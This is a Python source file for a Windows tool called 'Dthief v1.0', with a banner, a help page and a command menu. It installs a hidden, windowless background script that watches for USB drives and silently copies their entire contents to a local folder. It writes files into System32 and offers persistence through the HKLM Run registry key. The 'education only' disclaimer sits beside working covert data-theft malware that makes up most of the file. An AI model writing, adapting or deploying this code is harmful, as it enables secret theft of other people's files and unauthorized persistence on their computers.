import os, sys
from time import sleep
import shutil, socket
from sys import platform

setup_path=r"C:\DTheft\setup_Dthief.pyw"

if not platform == "win32" :
    while True :
        print("This version is only for Windows OS")
        os.system("cls")
        sleep(1.5)
else :
    pass

if not os.path.exists("C:\DTheft") :
    os.mkdir("C:\DTheft")
if os.path.exists("C:\DTheft\setup_Dthief.pyw") :
    pass 
elif not os.path.exists("C:\DTheft\setup_Dthief.pyw") :
    shutil.copy2(__file__, setup_path)

if os.path.exists("C:\Windows\System32\dthief.bat") :
    pass 
elif not os.path.exists("C:\Windows\System32\dthief.bat") :
    run_bat = open (r"C:\Windows\System32\dthief.bat", "w")
    run_bat.write("""@echo off\ncolor 9\npython C:\DTheft\setup_Dthief.pyw\npause>nul""")
    run_bat.close()

runpath = r"C:\DTheft\run_dthief.vbs"


def intro():
    os.system("color 9")
    os.system("mode con: COLS=90 LINES=28")
    os.system("cls")
    animation = "#"
    print("\t"*5, animation *40, "\n","\t"*4, animation *40," "*5, "| \n", "\t"*3, animation * 10+ "     DTHIEF v1.0", "\t", animation *10, " "*11, "|\n", "\t"*2, animation *40," "*21, "| \n", "\t"*1, animation *40," "*9," |__By saad anouar__|", "\n")
    print("""\n\n\n List commands: \n\n            [--help or --info] to Read about program
            [--run or --start] to execute the program
            [--stop or --kill] to finish the program
            [--exit or --quit] exit and close windows
            [--link or --down] visite original source
            [--bootup or --startup] add Dthief v1.0 program on startup windows
            [--unboot or --breakup] remove Dthief v1.0 from startup windows
\n
    ____________________________________________________________________________
    |                                                                           |
    | >> In anytime : YOU CAN CLICK Ctrl+C on your keyboard to quite program    |
    | >> No need to write full command to open program only the first time,     |
    |                          after that just open CMD and type : "dthief"     |
    +___________________________________________________________________________+
           \n """)
intro()

def help_page():
    os.system("mode con: COLS=94 LINES=49")
    os.system("color f")

    print("""*
NOTICE :                   {Please Read carefully}                |  Dthief v1.0 (help)  |
                                                                  | author : saad_anouar |                                                                        
             The Dthief v1.0 program work only for [windows os]                                   
                                                                                     
  Need to use following command "python setup_dthief.pyw" or write "python " and slide the 
     file "setup_dthief.pyw" to open it, and also do not rename the "setup_dthief.pyw".

  The command "python setup_dthief.pyw" you can use it only for the first time, beacsue 
                 After you can just open command prompt and type "dthief".                 
                                                                                      
  Driver thief (Dthief): is a code writing by python3 language, and he use to copy Data    
      silently from any usb connected on windows to "C:\DTheft_Data" folder, where  
           you find a folder named by date & time of copying data.                       

  The program run silently by enter (--run or --start) and stil working on background.

  The "log.txt" file created in folder with copied data is very important for ruuning 
   the program, do not try (DELETE\RENAME\EDIT) the file. but you can read it by any 
        editor, he content is only detailed informations about connected USB. 

  This program is purpose for education only, and any bad use the user remains respons 
-ible for it, and the developer has nothing to do with the way the program is used. 

  Dthief program is free for personal use only, and the link to the original program 
                    is on the famous website github on link bellow.     

  In case for using from company, need to get writing authorization from developer for that.                                                                                

  For personal use for developing others softwares, need to write the correct name of  
     developer on this code part before building or share your software or code. 

List of Commands :                                                                   
                Enter                 : Home page                                  
                --run or --start      : Lanch the program                          
                --kill or --stop      : stop program from running                  
                --info or --help      : you direct to this help page               
                --link or --down      : visite original source                     
                --bootup or --startup : add Dthief to startup windows              
                --unboot or --breakup : remove Dthief from startup Windows         
                                                                                     
[KEEP IN MIND]: after lanching the program, he still running on background even you   
                closed the terminal or exit program by typing (ctrl+C),and to stop 
                him youneed to write the command "--kill or stop" then you can exit                                
""")



def sys_dthief():

    
    def Dthief_program():

        dthief = open(r"C:\DTheft\dthief.pyw", "w")
        dthief.write("""\n
import subprocess, os, filecmp, shutil
from datetime import datetime
from time import sleep

while True:

    # path & variables 

    tmp_file = r"C:\Temp\log.txt"

    home_folder = r"C:\DTheft_USB"
    now = datetime.now()
    dt_string = now.strftime("%a%d%y%H%M%S")

    newfolder = home_folder+chr(92)+dt_string+chr(92) 
    files = str(newfolder)
    makelog = str(newfolder)+"log.txt"
    makefolder = str(newfolder)
    make_abs = os.path.abspath(makelog)


    output = subprocess.check_output("wmic logicaldisk get caption, drivetype", shell=True)
    data = str(output)
    x = data.find("2")
    if not x == -1 :

        get = data.find("2")
        cvt = int(get)
        divise = cvt - 9
        getD = data[divise:cvt]
        global lecteur
        lecteur = getD[0:2]
        print("Your driver stolen is: ", lecteur)
        path_dir = "dir /W "+lecteur+">"+tmp_file
        full_path_dir = str(path_dir)
        cmd = "cmd /C" +full_path_dir


        os.system(cmd)      # Creat the log file into c:\temp\log.txt
        



        if not os.path.exists(home_folder):
            os.system("cls")
            print("Folder name is: ",dt_string)
            add_folder = "md "+newfolder
            os.system(add_folder)

            shutil.copyfile(tmp_file, make_abs)
            dthief_files = "xcopy "+lecteur+"\*.* /Q /E /Y "+files+"*.*"
            os.system(dthief_files)
            

        elif os.path.exists(home_folder):
            list_comp = []
            for dirpath, dirnames, filenames in os.walk(home_folder):
                for filenames in [f for f in filenames if f.endswith("log.txt")]:
                    log = os.path.join(dirpath, filenames)
                    comp = filecmp.cmp(log, tmp_file)                 
                    list_comp.append(comp)
                    

            
            print(list_comp)
            if True in list_comp :
                os.system("cls")
                print("file found : ")
                print(" ")
                for content in os.listdir(lecteur):
                    print(content)
                    sleep(1.0)
                    

            else :
                os.system("cls")
                print("Folder name is: ",dt_string)
                print(" ")
                add_folder = "md "+newfolder
                os.system(add_folder)

                shutil.copyfile(tmp_file, make_abs)
                print("Stealing file Successfully  ...")
                print(" ")
                dthief_files = "xcopy "+lecteur+"\*.* /Q /E /Y "+files+"*.*"
                os.system(dthief_files)
                for content in os.listdir(lecteur):
                    print(content)
                    sleep(2.0)
                    
                            
    else :
        print("USB (not found) ")
        sleep(1.5)





        """)
        dthief.close()
        os.system("attrib +R +H C:\DTheft\dthief.pyw")
    Dthief_program()


    def command_dthief():
        bat_file = open(r"C:\DTheft\dthief_win.bat", "w")
        bat_file.write("python C:\DTheft\dthief.pyw")
        bat_file.close()
        os.system("attrib +R +H C:\DTheft\dthief_win.bat")
    command_dthief()


    def run_dthief():
        vbs_file = open(r"C:\DTheft\dthief_run.vbs", "w")
        vbs_file.write(r'''Set oShell = CreateObject ("Wscript.Shell") 
    Dim strArgs
    strArgs = "cmd /c C:\DTheft\dthief_win.bat"
    oShell.Run strArgs, 0, false
    ''')
        vbs_file.close()
        os.system(r"attrib +R +H C:\DTheft\dthief_run.vbs")
    run_dthief()
    

while True :
    intro()
    def user_answer():
        choose = input("C:\DTheft_Data>")

        if choose == "--run" or choose == "--RUN" or choose == "--start" or choose == "--START" :
            os.system("mode con: COLS=50 LINES=10")

            if os.path.exists(r"C:\DTheft\dthief_run.vbs") and os.path.exists(r"C:\DTheft\dthief_win.bat") and os.path.exists(r"C:\DTheft\dthief.pyw"):
                os.system("cls && color 4")
                print("\n"*3, " "*10," Dthief ACTIVTED SUCCESSFULY")
                sleep(1.0)
                os.system("start C:\DTheft\dthief_run.vbs")

            else :
                sys_dthief()
                os.system("start C:\DTheft\dthief_run.vbs")
                os.system("cls && color 4")
                print("\n"*6, " "*10," Dthief ACTIVTED SUCCESSFULY")
                sleep(2.0)

        elif choose == "--stop" or choose == "--kill" or choose == "--KILL" or choose == "--STOP":
            os.system("mode con: COLS=60 LINES=10")
            os.system("cls && color 9")
            print(" == >> Program stoped :( ")
            print("\n"*3, " "*5, "THANKS FOR USING MY PROGRAM 'Dthief v1' :) ", "\n", " "*19, "HOPE YOU LIKE IT", "\n", " "*19, "developed by : Saad Anouar", "\n"*2)
            
            sleep(2.5)
            os.system("taskkill /F /IM Python.exe >null")

        elif choose == "--help" or choose == "--HELP" or choose == "--info" or choose == "--INFO":
            os.system("cls")
            help_page()
            user_answer()
        elif choose == "--exit" or choose == "--EXIT" or choose == "--quit" or choose == "--QUIT" :
            os.system("cls && exit")
            sys.exit()
        elif choose == "--link" or choose == "--LINK" or choose == "--down" or choose == "--DOWN" :
            os.system("cls")
            IPaddress=socket. gethostbyname(socket. gethostname())
            if IPaddress!="127.0.0.1":
                os.system("start https://github.com/anrsaad/DTheft")
            else:
                os.system("mode con: COLS=50 LINES=10")
                os.system("cls && color 9")
                print("\n"*4," "*4, ":( CHECK YOUR CONNECTION AND TRY AGAIN ")
                sleep(2.0)
                pass
        elif choose == "--bootup" or choose == "--BOOTUP" or choose == "--startup" or choose == "--STARTUP" :
            os.system('REG ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v dthief /t REG_SZ /d "C:\DTheft\dthief_run.vbs"')
            os.system('msg * "Dthief v1.0 add to startup windows successfuly"')

        elif choose == "--unboot" or choose == "--UNBOOT" or choose == "--breakup" or choose == "--BREAKUP" :
            os.system("REG delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v dthief /f")
            os.system('msg * "Dthief v1.0 remove from startup windows successfuly"')



                
    user_answer()

        


